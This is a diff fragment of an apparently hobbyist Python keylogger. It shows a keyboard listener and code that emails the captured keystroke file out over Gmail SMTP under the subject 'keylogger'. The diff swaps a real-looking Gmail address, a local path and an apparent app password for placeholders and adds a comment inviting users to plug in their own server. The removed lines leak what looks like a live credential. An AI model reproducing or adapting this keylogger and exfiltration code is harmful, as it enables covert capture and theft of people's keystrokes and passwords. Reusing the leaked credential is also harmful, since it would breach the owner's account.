@@ -25,12 +25,13 @@ if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
     listener.join()  
-    
-email = "alternativeac128@gmail.com"
-receiver_email = "alternativeac128@gmail.com"
+
+#edit the code below with your own SMTP server
+email = "email@gmail.comm"
+receiver_email = "email.gmail.com"
 subject = "keylogger"
 message = str(datetime.datetime.now())
-file_path = r"C:\Users\jef\Desktop\shortcuts\keyloggerproject\keyfile.txt" 
+file_path = r"C:\file" 
 
 msg = MIMEMultipart()
 msg['From'] = email
@@ -54,7 +55,7 @@ text = msg.as_string()
 try:
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()  
-    server.login(email, "ivmw ifcc yhdy eekf")  
+    server.login(email, "aaaa aaaa aaaa aaaa")  
     server.sendmail(email, receiver_email, text)
     print("Email has been sent to " + receiver_email)
 except Exception as e:
